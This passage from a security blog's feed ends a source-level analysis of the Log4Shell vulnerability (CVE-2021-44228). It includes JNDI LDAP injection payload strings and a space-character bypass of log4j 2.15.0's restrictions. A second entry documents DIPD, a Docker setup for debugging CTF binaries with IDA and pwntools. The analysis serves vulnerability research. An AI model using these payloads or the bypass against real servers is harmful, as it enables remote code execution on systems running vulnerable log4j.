&lt;module&gt;log4j-mongodb3&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-mongodb4&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-cassandra&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-web&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jakarta-web&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-perf&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-iostreams&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jul&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-jpl&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-liquibase&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-appserver&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-osgi&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-docker&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-kubernetes&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-spring-boot&lt;/module&gt;</span></span><br><span class="line"><span class="comment">  &lt;module&gt;log4j-spring-cloud-config&lt;/module&gt; --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br></pre></td></tr></table></figure><p>To compile, the maven command to run is as below</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># set the env variable JAVA_HOME to the path of jdk1.8</span></span><br><span class="line">./mvnw clean install -t toolchains-sample-mac.xml -Dmaven.test.skip=<span class="literal">true</span> <span class="comment"># skip tests to accelerate</span></span><br></pre></td></tr></table></figure><p>The generated artifacts (.jar) will be in the <code>target</code> directory of every module.</p><h3 id="Analysis-of-the-source-code-1"><a href="#Analysis-of-the-source-code-1" class="headerlink" title="Analysis of the source code"></a>Analysis of the source code</h3><p>Firstly, change the version of log4j to <code>2.15.0</code> in the <code>pom.xml</code>, replace the packages <code>.jar</code> with the generated before.</p><p>Because it disabled the lookups by default in <code>2.15.0</code>, we have to enable it with configuration.</p><p>Modify or create the <code>log4j2.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;[%t] %-5level %m&#123;lookups&#125; %n&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Now, the payload as below will be parsed</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;sys:java.version&#125;</span><br></pre></td></tr></table></figure><p>However, the payload for JNDI won’t be parsed</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://ip:1389/#Exploit&#125;</span><br></pre></td></tr></table></figure><p>We know that the variable could be resolved but the JNDI has been restricted, let’s have a check with the process of variable resolving. Focus on <code>StrSubstitutor.resolveVariable()</code></p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119203640824.png" alt="image-20220119203640824"></p><p>Step into the <code>lookup()</code></p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119203737325.png" alt="image-20220119203737325"></p><p>We can find that the JNDI could be resolved as before, step into the <code>lookup()</code> again and check what is restricting the JNDI.</p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119203859702.png" alt="image-20220119203859702"></p><p>Step into the <code>lookup()</code> of <code>jndiManager</code></p><p>We can find there are some restrictions about the protocol and source.</p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204000127.png" alt="image-20220119204000127"></p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204003833.png" alt="image-20220119204003833"></p><p>As we found, the source has been restricted to some local IP, let’s assume that the restrict about source won’t afffect us as we are testing locally. Apart from this, we can find that the LDAP protocol is permitted.</p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204438853.png" alt="image-20220119204438853"></p><p>We can find that the Reference Object have been forbidden by <code>attributeMap.get(OBJECT_FACTORY)!=null</code></p><p>Apart from this, the another way to exploit with JNDI, deserialization, has been restricted too, it limited the classes to some basic type with <code>allowedClasses</code> as below</p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204722750.png" alt="image-20220119204722750"></p><p>Although it looks like perfect, but there is a vulnerability in the logic of exception handling </p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119204943826.png" alt="image-20220119204943826"></p><p>If there is a URI with some error in syntax, it will skip all the assessment and execution will arrive the JNDI <code>lookup</code>.But, how to have a URI which have some error in syntax but could work as intended?</p><p>Just add a space that didn’t encoded by urlencode as below</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;jndi:ldap://127.0.0.1:1389/# Exploit&#125;</span><br></pre></td></tr></table></figure><p>Run the trigger code again, we can find that the command in exploit code works.</p><p><img src="../../img/Vulnerability%20Analysis%20-%20CVE-2021-44228%20Log4Shell/image-20220119205538805.png" alt="image-20220119205538805"></p><h3 id="Summary-of-the-Bypassing"><a href="#Summary-of-the-Bypassing" class="headerlink" title="Summary of the Bypassing"></a>Summary of the Bypassing</h3><ul><li>The LookUps have to be enabled by developer</li><li>The source of LDAP have to be in the permit list, but the permit list only contains some local address by default</li></ul><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://www.youtube.com/watch?v=w2F67LbEtnk&feature=youtu.be">Log4j Vulnerability (Log4Shell) Explained // CVE-2021-44228 - YouTube</a></li><li><a href="https://logging.apache.org/log4j/2.x/changes-report.html">https://logging.apache.org/log4j/2.x/changes-report.html</a></li><li><a href="https://paper.seebug.org/1786/">https://paper.seebug.org/1786/</a></li><li><a href="https://www.anquanke.com/post/id/262668">https://www.anquanke.com/post/id/262668</a></li><li><a href="https://logging.apache.org/log4j/2.x/manual/configuration.html">Log4j – Configuring Log4j 2 (apache.org)</a></li><li><a href="https://xz.aliyun.com/t/10649#toc-2">https://xz.aliyun.com/t/10649#toc-2</a></li><li><a href="https://www.anquanke.com/post/id/201181">JNDI with LDAP </a></li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/serial.html">Serializable Objects (oracle.com)</a></li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/objects/storing/reference.html">Referenceable Objects and References (oracle.com)</a></li><li><a href="https://www.icode9.com/content-4-1253127.html">https://www.icode9.com/content-4-1253127.html</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;Using Java 8u181&lt;/p&gt;</summary>
    
    
    
    <category term="Vuln-Analysis" scheme="https://www.4xpl0r3r.com/categories/Vuln-Analysis/"/>
    
    
    <category term="CVE" scheme="https://www.4xpl0r3r.com/tags/CVE/"/>
    
    <category term="Java" scheme="https://www.4xpl0r3r.com/tags/Java/"/>
    
    <category term="JNDI" scheme="https://www.4xpl0r3r.com/tags/JNDI/"/>
    
    <category term="Format String" scheme="https://www.4xpl0r3r.com/tags/Format-String/"/>
    
  </entry>
  
  <entry>
    <title>DIPD Document</title>
    <link href="https://www.4xpl0r3r.com/Docs/DIPD-Document/"/>
    <id>https://www.4xpl0r3r.com/Docs/DIPD-Document/</id>
    <published>2021-08-25T21:18:54.000Z</published>
    <updated>2022-01-27T15:07:14.178Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/4xpl0r3r/DIPD">4xpl0r3r/DIPD: Debug with IDA and Pwntools in Docker (DIPD) (github.com)</a></p><span id="more"></span><article class="message message-immersive is-primary"><div class="message-body"><i class="fas fa-globe-asia mr-2"></i>This article is also available in <a href="https://cn.4xpl0r3r.com/%E6%96%87%E6%A1%A3/DIPD-%E6%96%87%E6%A1%A3/">简体中文</a>.</div></article><h2 id="About"><a href="#About" class="headerlink" title="About"></a>About</h2><p>With this, you can debug a program in docker and make use of both IDA and Pwntools</p><p>SAFT QUICK POWERFUL(IDA)</p><h2 id="Get-Started"><a href="#Get-Started" class="headerlink" title="Get Started"></a>Get Started</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/4xpl0r3r/DIPD.git</span><br></pre></td></tr></table></figure><ol><li>Install docker, docker-compose, and IDA (You can deploy them in separated hosts, but the network between them must be OK)</li><li>move the binary to <code>debug/</code> directory and rename the binary to <code>todebug</code></li><li>run the command <code>docker-compose up</code> in the root directory of this project</li></ol><p>Access to the STDIO of binary</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc docker.ip 23458</span><br></pre></td></tr></table></figure><p>IDA Pro Debugger Arguments (version 7.6)</p><ul><li>Type: Remote Linux Debugger (Attach)</li><li>Hostname: docker.ip (the IP of your host which running docker)</li><li>Port: 23946</li><li>No password  need</li></ul><p><strong>Caution</strong></p><ul><li>You have to run the binary by netcat or pwntools before attaching the process, or you can’t see the desired process in your IDA</li><li>You have to run the docker in a 64bit arch Linux to support both 32bit(i386) and 64bit(amd64) debug</li></ul><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>Start the DIPD</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up</span><br></pre></td></tr></table></figure><p><img src="../../img/DIPD-Docs/image-20210826060049976.png" alt="image-20210826060049976"></p><p>Run and connect to the STDIO of your binary</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc docker.ip 23458</span><br></pre></td></tr></table></figure><p>Now, your binary should have been running</p><p>Let’s use our IDA and start the IDA Debugger</p><p><img src="../../img/DIPD-Docs/image-20210826060028343.png" alt="image-20210826060028343"></p><p>Input Information and click “OK”</p><p><img src="../../img/DIPD-Docs/image-20210826060059572.png" alt="image-20210826060059572"></p><p>Now you can see the processes in your docker, choose <code>./todebug</code> and click “OK”</p><p><img src="../../img/DIPD-Docs/image-20210826060110022.png" alt="image-20210826060110022"></p><p>Now, you should have got into IDA debug view without any error and exception.</p><h2 id="file-docker-compose-yml"><a href="#file-docker-compose-yml" class="headerlink" title="file - docker-compose.yml"></a>file - docker-compose.yml</h2><h3 id="image"><a href="#image" class="headerlink" title="image"></a>image</h3><p>You can choose the base image as you like, here are some useful options</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">i386/ubuntu:16.04</span><br><span class="line">i386/ubuntu:18.04</span><br><span class="line">amd64/ubuntu:16.04</span><br><span class="line">amd64/ubuntu:18.04</span><br></pre></td></tr></table></figure><p>You have to run your docker in 64bit Arch to support both i386 and amd64, or the only option is i386 </p><h3 id="Other-arguments"><a href="#Other-arguments" class="headerlink" title="Other arguments"></a>Other arguments</h3><p>Just have a look at the annotation over there</p><h2 id="directory-files"><a href="#directory-files" class="headerlink" title="directory - files"></a>directory - files</h2><h3 id="directory-debs"><a href="#directory-debs" class="headerlink" title="directory - debs"></a>directory - <code>debs</code></h3><p>the apt packages for socat, used for fast install and offline support</p><h3 id="files-linux-server-64"><a href="#files-linux-server-64" class="headerlink" title="files - linux_server[64]"></a>files - <code>linux_server[64]</code></h3><p>IDA Debug Server v7.6</p><p>If you don’t want to use IDA v7.6, just replace them with yours</p><h3 id="file-init-sh"><a href="#file-init-sh" class="headerlink" title="file - init.sh"></a>file - <code>init.sh</code></h3><p>This file is used for initializing the debug environment, you can modify it to make any adjustment</p><h2 id="directory-debug"><a href="#directory-debug" class="headerlink" title="directory - debug"></a>directory - debug</h2><p>Just place the binary you want to debug here</p><p>If you have an application isn’t having only 1 ELF file, just copy them all to this directory</p><p>If you don’t want to change the name of your elf file, you could change the argument <code>debug_name</code> in <code>docker-compose.yml</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/4xpl0r3r/DIPD&quot;&gt;4xpl0r3r/DIPD: Debug with IDA and Pwntools in Docker (DIPD) (github.com)&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="Docs" scheme="https://www.4xpl0r3r.com/categories/Docs/"/>
    
    
    <category term="PWN" scheme="https://www.4xpl0r3r.com/tags/PWN/"/>
    
    <category term="CTF" scheme="https://www.4xpl0r3r.com/tags/CTF/"/>
    
    <category term="Environment" scheme="https://www.4xpl0r3r.com/tags/Environment/"/>
    
  </entry>
  
</feed>
